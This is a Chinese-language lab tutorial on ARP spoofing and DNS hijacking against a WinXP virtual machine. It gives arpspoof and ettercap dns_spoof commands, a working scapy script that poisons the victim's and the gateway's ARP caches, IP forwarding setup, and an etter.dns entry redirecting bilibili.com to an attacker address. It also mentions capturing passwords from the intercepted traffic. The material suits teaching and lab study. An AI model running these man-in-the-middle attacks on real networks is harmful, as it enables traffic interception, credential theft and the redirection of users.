# 一条命令，实现ARP欺骗+DNS劫持

## 0、前言：在开始前你需要知道的东西：

### （1）一丢丢的计网基础（ARP是什么，DNS是什么，在二层和三层的工作原理）

ARP：在局域网内，数据包交换的形式是帧，帧传播依靠的是MAC地址，而我们只有主机的IP地址，192.168.xx.xx/10.0.xx.xx之类的，ARP协议即是将主机的IP地址转为MAC地址的协议，第一次会在局域网内广播ARP报文询问指定IP对应的MAC的地址，有主机回应就会把其MAC地址单播给询问主机，然后询问主机就会将该IP和MAC地址的对应关系写入ARP缓存表以便下次使用，下次就不用再以广播的方式获取MAC地址了

DNS：一般我们访问一个网页（或者资源）都是以域名的形式，无论是在浏览器里输入URL还是直接点击A标签，都是通过域名的方式访问资源，但是在网络三层中数据包不是靠域名来交换的，而是靠资源的IP，这就需要我们将域名转为IP地址以便传输数据包，DNS就是这样的存在，主机将需要访问的资源域名发送到DNS服务器上查询其IP，再将获得的结果发送回来，并且在主机本地缓存一份，以后访问就先从本地缓存先找起，这点很关键，等会我们就是在本地DNS缓存上作文章。

### （2）一丢丢的Linux基础（基础命令的使用）

没什么好说的，dddd

### （3）一丢丢python基础（能看懂代码即可）

下面有一段Python代码，有助于理解ARP欺骗原理（重点）

### （4）关于ARP和DNS怎么扯到一起

这就涉及到局域网中一个特殊且重要的角色——网关，网关是访问外网所必须的，相当于连接内网和外网的纽带，在访问外网时，主机会将请求先发送给网关，由网关转发请求给指定服务器获取资源，所以也由网关来请求DNS服务器将域名转为IP地址（不甚准确，在本地无缓存的情况下成立），那么如何获取网关的MAC地址（网关的IP一般由路由器或者其他设备在拨号完成后自动分配，好几种情况，只需要知道网关IP会自动分配就行了），没错，就是通过如上提到的ARP协议获取网关的MAC地址完成通信。这不就串起来了。

## 1、ARP欺骗概念（单向欺骗，双向欺骗）+DNS劫持概念：

## ![ARP欺骗](D:\BaiduNetdiskDownload\Cpp-0-1-Resource-master\ARP欺骗.png)

### ARP单向欺骗：

只欺骗被攻击机，伪造成被攻击机的网关，被攻击机发出的流量都先发送至攻击机

### ARP双向欺骗：

欺骗被攻击机，也欺骗被攻击机实际网关，对被攻击机来说，攻击机（伪造）为其网关，对被攻击机实际网关来说，攻击机（伪造）为被攻击机，实现双向欺骗，无论是攻击机还是被攻击机实际网关发送的流量包都会发送至攻击机。

### DNS劫持（又叫域名劫持）：

![DNS劫持](D:\BaiduNetdiskDownload\Cpp-0-1-Resource-master\DNS劫持.png)

攻击机向目标机器发送构造好的ARP应答数据包，ARP欺骗成功后，嗅探到对方发出的DNS请求数据包，分析数据包取得ID和端口号后，向目标发送自己构造好的一个DNS返回包，对方收到DNS应答包后，发现ID和端口号全部正确，即把返回数据包中的域名和对应的IP地址保存进DNS缓存表中，而后来的当真实的DNS应答包返回时则被丢弃。

## 2、ARP欺骗+DNS劫持欺骗实验环境：

```python
Kali攻击机：		IP：192.168.32.132			MAC：00:0c:29:df:c8:ef
WinXP被攻击机：		IP：192.168.32.131			MAC：00:0c:29:dc:23:79
网关：				 IP：192.168.32.2			MAC：00:50:56:f8:b1:7d（可用arp -a查看）
```

## 3、ARP（攻击）欺骗：

```python
kali实施arp欺骗命令：（单向，仅欺骗被攻击机）
arpspoof -i eth0 -t 192.168.32.131 192.168.32.2
(双向：arpspoof -i eth0 -t 192.168.32.2 192.168.32.131)
-i：指定使用的监听网卡
-t：攻击主机目标地址 攻击主机网关地址

附：Python脚本版（效果一样的，更有利于理解原理）：
from scapy.layers.l2 import getmacbyip, Ether, ARP
from scapy.sendrecv import sendp
import time

def arp_spoof():
   iface  ="VMware Virtual Ethernet Adapter for VMnet8"

#被攻击机IP和MAC，WinXP
   target_ip = '192.168.32.131'
   target_mac = '00:0c:29:dc:23:79'

#攻击机IP和MAC，kali
#    spoof_ip = '192.168.32.132'
   spoof_mac = '00:0c:29:df:c8:ef'

#网关IP和MAC
   gateway_ip = '192.168.32.2'
   gateway_mac = getmacbyip(gateway_ip)

   while True:
       #构造网络层数据包，欺骗被攻击机，伪造成网关
       packet = Ether(src=spoof_mac, dst=target_mac)/ARP(hwsrc=spoof_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=2)
       sendp(packet, iface=iface)

       #构造网络层数据包，欺骗网关，伪造成被攻击机
       packet = Ether(src=spoof_mac, dst=gateway_mac)/ARP(hwsrc=spoof_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, op=2)
       sendp(packet, iface)
       
       time.sleep(1);

if __name__ == '__main__':
    arp_spoof()
```

此时在WinXP上使用arp -a命令查看IP和MAC地址对应关系，网关IP（192.168.32.2）对应MAC地址为攻击机IP（192.168.32.132）对应MAC地址（00:0c:29:df:c8:ef）即为成功欺骗，此时WinXP是无法上网的。

继续进阶，修改/proc/sys/net/ipv4/ip_forward的值为1，开启kali的流量转发功能

```shell
#查看ip_forward值
┌──(root㉿kali)-[~/Desktop]
└─# cat /proc/sys/net/ipv4/ip_forward
0
#修改其值为1
┌──(root㉿kali)-[~/Desktop]
└─# echo 1 > /proc/sys/net/ipv4/ip_forward
#开启成功
┌──(root㉿kali)-[~/Desktop]
└─# cat /proc/sys/net/ipv4/ip_forward     
1
```

这时重新实施arp欺骗，欺骗成功后被攻击机是可以上网，但是是把流量转发给攻击机，由攻击机充当其网关的角色来转发流量，实现流量劫持。

可以使用wireshark，fiddler等抓包工具来抓取数据包，获取被攻击机敏感信息如账号密码等（PS：如有兴趣可自行搜索教程，这里重点不是这个，恕不赘述）

经过如上步骤，已达成DNS劫持的前提条件，下面继续实验

## 4、DNS劫持：

### 准备工作：

安装ettercap，一般kali自带的只有文本版，也可以安装图形化界面版

```shell
┌──(root㉿kali)-[~/Desktop]
└─# apt-get install ettercap-graphical

#安装完成后，修改配置文件/etc/ettercap/etter.dns
┌──(root㉿kali)-[~/Desktop]
└─# vim /etc/ettercap/etter.dns 
#在最后一行（任意位置都可以啦，记得把注释去掉）添加如下字段：
域名	DNS记录类型	访问域名时需要映射的IP
例：
www.bilibili.com	A	192.168.32.133
*	PTR	192.168.32.133
注：第三个字段IP是作为Apache/Nginx服务器域名来访问，映射时攻击机会向DNS服务器发出对该域名（IP）的请求，国内服务器无域名或域名未备案的话大概率不能访问
```

配置文件修改好后，可以开始使用工具进行DNS劫持了

### 命令行版：

```shell
┌──(root㉿kali)-[~/Desktop]
└─# ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /192.168.32.131// /192.168.32.2//
# -Tq:T以文本模式运行，q以安静模式运行
# -i 指定网卡
# -M （MITM-attack）指定中间人攻击方式，这里是ARP欺骗
# -P 指定插件（也算攻击方式的一种）
# 192.168.32.131 被攻击机IP
# 192.168.32.2	网关IP
```

运行如上命令后，被攻击机DNS缓存内就被写入污染后的DNS记录，且短时间内存在，可在被攻击机上使用如下命令查看：

```shell
Windows：
ipconfig /displaydns
Linux:
nscd -g（查看DNS统计信息，需要看是否自带此工具）
```

### 图形化界面版：

```shell
#kali终端输入ettercap -G或kali菜单直接搜索ettercap使用
┌──(root㉿kali)-[~/Desktop]
└─# ettercap -G    
```

![image-20221120124420348](C:\Users\ZWXT\AppData\Roaming\Typora\typora-user-images\image-20221120124420348.png)

![image-20221120123344729](C:\Users\ZWXT\AppData\Roaming\Typora\typora-user-images\image-20221120123344729.png)

![image-20221120124006905](C:\Users\ZWXT\AppData\Roaming\Typora\typora-user-images\image-20221120124006905.png)



![image-20221120124523793](C:\Users\ZWXT\AppData\Roaming\Typora\typora-user-images\image-20221120124523793.png)



此时访问上面配置文件指定域名时会被定向至指定的IP地址，成功实现DNS劫持，且短时间内生效，发来正确的DNS记录也会被丢弃。这个时候就可以去看看效果了。实验结束记得关闭工具的使用，刷新下DNS缓存及ARP缓存，顺便清除浏览器缓存

```shell
Windows：
#刷新DNS缓存 ipconfig /flushdns
#刷新ARP缓存 ARP -d
```

